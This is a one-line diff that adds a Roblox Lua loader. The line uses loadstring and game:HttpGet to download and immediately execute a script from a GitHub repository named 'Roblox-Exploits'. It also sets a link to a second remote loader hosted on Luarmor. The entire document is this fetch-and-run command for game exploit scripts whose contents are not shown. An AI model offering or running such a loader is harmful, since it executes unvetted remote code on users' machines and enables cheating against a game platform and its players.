@@ -1,0 +1,1 @@
+(loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/UIs/KeyUI/KeyLuarmor.lua"))()).ScriptLink = "https://api.luarmor.net/files/v3/loaders/c4ce76cd36f2afee4dcee7e87576e5fa.lua"
